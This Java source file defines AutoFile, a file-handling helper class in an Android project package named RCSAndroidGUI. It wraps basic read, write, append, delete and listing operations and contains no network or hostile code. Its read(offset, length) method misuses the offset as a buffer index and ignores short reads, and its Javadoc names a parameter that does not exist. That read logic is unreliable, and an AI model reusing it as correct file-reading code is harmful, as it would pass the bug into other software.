package com.ht.RCSAndroidGUI.file;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.Date;

import com.ht.RCSAndroidGUI.Evidence;
import com.ht.RCSAndroidGUI.utils.Check;

/**
 * The Class AutoFlashFile.
 */
public final class AutoFile {

	File file;

	/**
	 * Instantiates a new auto flash file.
	 * http://developer.android.com/guide/topics/data/data-storage.html#filesInternal
	 * 
	 * @param filename_
	 *            the filename_
	 * @param hidden_
	 *            the hidden_
	 */
	public AutoFile(final String filename) {
		file = new File(filename);
	}

	public boolean write(byte[] data, int offset, boolean append) {
		OutputStream out = null;
		try {
			out = new BufferedOutputStream(new FileOutputStream(file,append));
			out.write(data, offset, data.length - offset);
			out.flush();
			return true;
		} catch (Exception ex) {
			return false;
		} finally {
			if (out != null) {
				try {
					out.close();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}
	}

	public byte[] read(int offset, int length) {
		InputStream in = null;
		try {
			in = new BufferedInputStream(new FileInputStream(file));
			byte[] buffer = new byte[length];

			in.read(buffer, offset, length);
			return buffer;
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();

		} finally {
			if (in != null) {
				try {
					in.close();
				} catch (IOException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}
		
		return null;
	}

	public byte[] read() {
		return read(0,(int) file.length());
	}

	public boolean exists() {
		return file.exists();
	}

	public long getSize() {
		return file.length();
	}

	public void append(byte[] data) {
		write(data, 0, true);
	}

	public void write(byte[] data) {
		write(data, 0, false);
	}

	public void flush() {
	
	}

	public void delete() {
		file.delete();
	}

	public boolean isDirectory() {
		return file.isDirectory();
	}

	public Date getFileTime() {
		return new Date(file.lastModified());
	}

	public String[] list() {
		return file.list();
	}
}
